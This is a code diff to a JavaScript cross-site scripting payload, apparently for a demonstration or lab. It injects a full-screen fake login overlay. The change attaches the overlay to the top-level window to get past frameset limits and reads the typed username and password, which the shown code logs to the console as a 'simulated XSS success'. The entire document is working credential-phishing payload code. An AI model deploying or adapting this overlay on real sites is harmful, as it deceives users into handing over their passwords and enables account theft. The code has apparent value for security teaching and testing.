@@ -1,6 +1,6 @@
 (function() {
-    // 建立全螢幕黑色半透明背景遮罩
-    var overlay = document.createElement('div');
+    // 建立全螢幕黑色半透明背景遮罩（透過 top.document 確保掛載至最外層視窗）
+    var overlay = top.document.createElement('div');
     overlay.style.position = 'fixed';
     overlay.style.top = '0';
     overlay.style.left = '0';
@@ -23,12 +23,13 @@
         </div>
     `;
 
-    document.body.appendChild(overlay);
+    // 強制附加至最外層 top 的 body 避開 frameset 限制
+    top.document.body.appendChild(overlay);
 
-    // 監聽按鈕點擊，在 Console 印出輸入的內容
-    document.getElementById('fake_submit').addEventListener('click', function() {
-        var user = document.getElementById('fake_user').value;
-        var pass = document.getElementById('fake_pass').value;
+    // 透過 overlay.querySelector 尋找按鈕與輸入框，避免在 frameset 中抓錯元素
+    overlay.querySelector('#fake_submit').addEventListener('click', function() {
+        var user = overlay.querySelector('#fake_user').value;
+        var pass = overlay.querySelector('#fake_pass').value;
         console.log("【XSS 模擬成功】讀取到帳密：", { account: user, password: pass });
         overlay.remove(); // 關閉視窗
     });
